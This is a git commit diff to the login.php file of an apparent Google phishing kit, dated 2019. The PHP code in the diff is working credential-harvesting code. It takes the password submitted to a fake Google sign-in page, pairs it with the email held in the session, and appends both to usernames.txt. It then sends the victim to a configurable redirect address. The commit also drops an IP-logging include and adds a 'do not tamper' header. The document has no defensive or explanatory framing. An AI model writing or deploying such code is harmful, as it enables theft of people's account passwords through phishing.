ad1dc4ce43dbb83f03f7714df607626052558556
inc0gnit0 <iinc0gnit0@pm.me>
2019-12-21 16:44:38 -0600

    Add files via upload

--- Websites/Google/login.php
+++ Websites/Google/login.php
@@ -1,13 +1,11 @@
-<?php
-include 'ip.php';
-
+<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
 			session_start();
 			
 			$pass = $_POST["password"];
 			$email=$_SESSION["Email"];
 			
 			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
-  			header('Location: https://google.com'); # This is where your site will redirect to, you may change it(default: google.com) #
+  			header('Location: <REDIRECT>');
 			exit();
 			
 			
